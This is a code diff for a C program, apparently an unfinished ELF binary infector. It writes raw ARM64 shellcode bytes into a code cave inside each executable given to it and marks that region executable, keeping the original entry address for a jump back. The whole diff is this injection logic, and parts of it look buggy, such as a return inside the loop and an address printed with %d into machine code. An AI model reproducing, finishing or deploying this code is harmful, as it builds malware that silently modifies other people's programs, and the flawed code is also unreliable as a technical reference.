@@ -17,6 +17,8 @@
 #define MIN_ARGS 2
 #define MOV_RET_INSTR "\x80\xd2" // note: bytes are presented in reverse order
 
+Elf64_Addr convertLittleEndian(Elf64_Addr addr);
+
 int main(int argc, char **argv) {
     if (argc < MIN_ARGS) {
         fprintf(stderr, "Too few arguments to call program\n");
@@ -26,19 +28,33 @@ int main(int argc, char **argv) {
     for (int i = 1; i < argc; i++) {
         int fd = open(argv[i], O_RDWR);
 
-        if (!Elf(fd)) {
-            close(fd);
-            continue;
-        }
+        if (!Elf(fd)) goto end;
 
         Elf64_Ehdr ehdr = ElfExtractHeader(fd);
-        Elf64_Phdr phdr = ElfExtractProgramHeader(fd);
+        Elf64_Phdr phdr = ElfExtractProgramHeader(fd, ehdr);
 
         // store the original return address
         Elf64_Addr original = ehdr.e_entry;
 
         CodeCave codeCave = FindCodeCave(fd, phdr);
         
+        Elf64_Addr shiftedAddr = convertLittleEndian(original);
+
+        int err = lseek(fd, codeCave.offset, SEEK_SET);
+        // is this bad? Does this make me the worst programmer ever? Probably
+        // this could easily be a function
+        // I'm leaving this as a goto right now
+        // TODO: care about code style
+        if (err < 0) goto end;
+        // are these zero bytes going to be identified as a null terminator?
+        dprintf(fd, "\xfd\x7b\xbf\xa9\xfd\x03\x91\x00\x00\x90\x00\x60\x1e\x91\xb3\xff\xff\x93%d\x80\xd2", shiftedAddr);
+
+        err = ElfMarkExecutable(ehdr, codeCave.offset, fd);
+        if (err) goto end;
+        
+        end:
+            close(fd);
+            return 0;
     }
 }
 
